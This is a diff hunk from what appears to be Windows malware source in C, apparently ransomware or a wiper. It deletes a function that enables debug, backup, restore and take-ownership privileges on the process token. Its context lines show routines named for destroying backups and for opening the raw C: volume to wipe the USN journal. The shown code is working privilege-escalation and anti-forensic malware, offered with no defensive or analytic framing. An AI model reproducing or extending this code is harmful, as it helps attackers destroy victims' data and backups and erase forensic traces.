@@ -52,36 +52,6 @@ void NukeBackups(void) {
 }
 
 // ===================== PRIVILEGE ESCALATION =====================
-void ElevatePrivileges(void) {
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(),
-                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        return;
-    }
-    
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-    
-    const char* privs[] = {
-        "SeDebugPrivilege",
-        "SeBackupPrivilege",
-        "SeRestorePrivilege",
-        "SeTakeOwnershipPrivilege",
-        NULL
-    };
-    
-    for (int i = 0; privs[i]; i++) {
-        if (LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-        }
-    }
-    
-    CloseHandle(hToken);
-}
-
 // ===================== USN JOURNAL WIPE =====================
 void WipeUSNJournal(void) {
     HANDLE hVol = CreateFileA("\\\\.\\C:",
